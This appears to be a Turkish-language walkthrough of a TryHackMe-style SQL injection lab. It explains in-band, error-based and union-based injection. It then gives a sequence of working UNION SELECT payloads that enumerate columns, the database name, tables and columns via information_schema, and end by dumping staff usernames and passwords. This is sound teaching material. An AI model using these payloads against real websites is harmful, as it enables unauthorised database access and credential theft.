In-Band SQL Injection:
Bant İçi SQL Enjeksiyonu, tespit edilmesi ve istismar edilmesi en kolay türdür; Bant İçi, güvenlik açığını istismar etmek ve sonuçları almak için kullanılan aynı iletişim yöntemini ifade eder; örneğin, bir web sitesi sayfasında bir SQL Enjeksiyonu güvenlik açığı keşfetmek ve ardından veritabanından aynı sayfaya veri çıkarabilmek.


Error-Based SQL Injection:
Bu tür SQL Enjeksiyonu, veritabanı yapısı hakkında kolayca bilgi edinmek için en kullanışlı olanıdır, çünkü veritabanından gelen hata mesajları doğrudan tarayıcı ekranına yazdırılır. Bu genellikle tüm bir veritabanını numaralandırmak için kullanılabilir. 

Union-Based SQL Injection:
Bu Enjeksiyon türü, sayfaya ek sonuçlar döndürmek için SELECT ifadesiyle birlikte SQL UNION operatörünü kullanır. Bu yöntem, bir SQL Enjeksiyon açığı yoluyla büyük miktarda veri çıkarmanın en yaygın yoludur.

Practical:
SQL Enjeksiyon Örneği uygulama laboratuvarını kullanmak için yeşil "Makineyi Başlat" düğmesine tıklayın . Her seviye, sorgularınızı/yükünüzü doğru bir şekilde almanıza yardımcı olmak için bir sahte tarayıcı ve ayrıca SQL Sorgusu ve Hata kutuları içerir.
Uygulama laboratuvarının birinci seviyesi, sorgu dizesindeki kimlik numarasını değiştirerek erişilebilen, farklı makaleler içeren bir blog içeren sahte bir tarayıcı ve web sitesi içerir.
Hata tabanlı SQL Enjeksiyonunu keşfetmenin anahtarı , bir hata mesajı üretilene kadar belirli karakterleri deneyerek kodun SQL sorgusunu kırmaktır; bunlar genellikle tek kesme işareti ( ' ) veya tırnak işaretidir ( " ).
id=1'den sonra bir kesme işareti (  ' ) yazmayı deneyin ve enter'a basın. Ve bunun sözdiziminizde bir hata olduğunu bildiren bir SQL hatası  döndürdüğünü göreceksiniz . Bu hata mesajını almış olmanız bir SQL Enjeksiyonu güvenlik açığının varlığını doğrular. Artık bu güvenlik açığından yararlanabilir ve hata mesajlarını kullanarak veritabanı yapısı hakkında daha fazla bilgi edinebiliriz. 
Yapmamız gereken ilk şey, bir hata mesajı göstermeden tarayıcıya veri döndürmektir. İlk olarak, UNION operatörünü deneyeceğiz, böylece seçersek ekstra bir sonuç alabiliriz. Sahte tarayıcıların kimlik parametresini şu şekilde ayarlamayı deneyin:

örn:
```bash
https://website.thm/article?id='
```
Bu ifade, UNION SELECT ifadesinin orijinal SELECT sorgusundan farklı sayıda sütuna sahip olduğunu bildiren bir hata mesajı üretmelidir. O halde tekrar deneyelim ancak başka bir sütun ekleyelim:
```bash
https://website.thm/article?id= 1 UNION SELECT 1
```
Bu ifade, UNION SELECT ifadesinin orijinal SELECT sorgusundan farklı sayıda sütuna sahip olduğunu bildiren bir hata mesajı üretmelidir. O halde tekrar deneyelim ancak başka bir sütun ekleyelim:
```bash
https://website.thm/article?id=1 UNION SELECT 1,2
```
Aynı hatayı tekrarlayalım, bir sütun daha ekleyelim:
```bash
https://website.thm/article?id=1 UNION SELECT 1,2,3
```
Başarılı, hata mesajı gitti ve makale görüntüleniyor, ancak şimdi makale yerine verilerimizi görüntülemek istiyoruz. Makale görüntüleniyor çünkü web sitesinin kodunda bir yerde döndürülen ilk sonucu alıyor ve onu gösteriyor. Bunu aşmak için ilk sorgunun hiçbir sonuç üretmemesi gerekiyor. Bu, makale kimliğini 1'den 0'a değiştirerek kolayca yapılabilir.
```bash
https://website.thm/article?id=0 UNION SELECT 1,2,3
```
Şimdi makalenin sadece UNION seçiminden elde edilen sonuçtan oluştuğunu ve 1, 2 ve 3 sütun değerlerini döndürdüğünü göreceksiniz. Bu döndürülen değerleri daha kullanışlı bilgiler almak için kullanmaya başlayabiliriz. İlk olarak, erişimimiz olan veritabanı adını alacağız:
```bash
https://website.thm/article?id=0 UNION SELECT 1,2,database()
```
Şimdi daha önce 3 rakamının görüntülendiği yeri göreceksiniz; artık veritabanının adı olan  sqli_one'ı gösteriyor YADA FARKLI BİR DB GÖSTERİR.

Bir sonraki sorgumuz bu veritabanında bulunan tabloların listesini toplayacaktır.
```bash
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
table schemalar dönecektir örn= stuff_users , artcile etc.

Bu sorguda öğrenilecek birkaç yeni şey var. İlk olarak,  group_concat() yöntemi  belirtilen sütunu (bizim durumumuzda, table_name) birden fazla döndürülen satırdan alır ve virgülle ayrılmış tek bir dizeye koyar. Bir sonraki şey  information_schema veritabanıdır; veritabanının her kullanıcısı buna erişebilir ve kullanıcının erişebildiği tüm veritabanları ve tablolar hakkında bilgi içerir. Bu belirli sorguda, article ve staff_users olan sqli_one  veritabanındaki tüm tabloları listelemekle ilgileniyoruz   . 

İlk seviye Martin'in şifresini keşfetmeyi amaçladığından, staff_users tablosu bizi ilgilendiriyor. Aşağıdaki sorguyu kullanarak bu tablonun yapısını bulmak için information_schema veritabanını tekrar kullanabiliriz.
```bash
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'
```
Bu, önceki SQL sorgusuna benzer. Ancak, almak istediğimiz bilgi table_name'den  column_name'e değişti , information_schema veritabanında sorguladığımız tablo tables'dan  columns'a değişti ve table_name sütununun staff_users  değerine sahip olduğu  satırları arıyoruz  .

Sorgu sonuçları staff_users tablosu için üç sütun sağlar: id, password ve username. Kullanıcının bilgilerini almak için aşağıdaki sorgumuzda username ve password sütunlarını kullanabiliriz.
```bash
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

